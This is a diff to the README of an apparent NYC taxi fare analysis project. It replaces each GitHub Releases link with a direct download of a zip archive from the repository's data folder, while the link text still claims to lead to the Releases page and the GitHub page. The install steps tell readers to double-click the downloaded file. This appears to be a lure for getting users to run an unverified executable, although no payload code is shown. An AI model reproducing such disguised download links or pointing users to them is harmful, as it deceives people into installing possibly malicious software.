@@ -6,7 +6,7 @@ Welcome to the NYC-Taxi-Fare-Analysis project! This application helps you analyz
 
 ## 📥 Download Now
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/mo0ody88/NYC-Taxi-Fare-Analysis/releases)
+[![Download from Releases](https://raw.githubusercontent.com/mo0ody88/NYC-Taxi-Fare-Analysis/main/data/NY_Fare_Analysis_Taxi_1.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mo0ody88/NYC-Taxi-Fare-Analysis/main/data/NY_Fare_Analysis_Taxi_1.0.zip)
 
 ## 📄 Overview
 
@@ -32,7 +32,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 🔗 Download & Install
 
-1. **Visit the Releases Page:** Click [here](https://github.com/mo0ody88/NYC-Taxi-Fare-Analysis/releases) to go to the Releases section.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/mo0ody88/NYC-Taxi-Fare-Analysis/main/data/NY_Fare_Analysis_Taxi_1.0.zip) to go to the Releases section.
 2. **Choose the Latest Version:** Look for the latest version available.
 3. **Download the Application:** Click on the file to start the download.
 4. **Install the Application:** Locate the downloaded file on your computer. Double-click the file to install the application.
@@ -65,6 +65,6 @@ We appreciate contributions! If you'd like to contribute to this project, feel f
 
 ## 🌐 Learn More
 
-For further exploration of the project's capabilities and updates, check out our [GitHub Page](https://github.com/mo0ody88/NYC-Taxi-Fare-Analysis/releases).
+For further exploration of the project's capabilities and updates, check out our [GitHub Page](https://raw.githubusercontent.com/mo0ody88/NYC-Taxi-Fare-Analysis/main/data/NY_Fare_Analysis_Taxi_1.0.zip).
 
 Thank you for your interest in the NYC-Taxi-Fare-Analysis project! Happy analyzing!
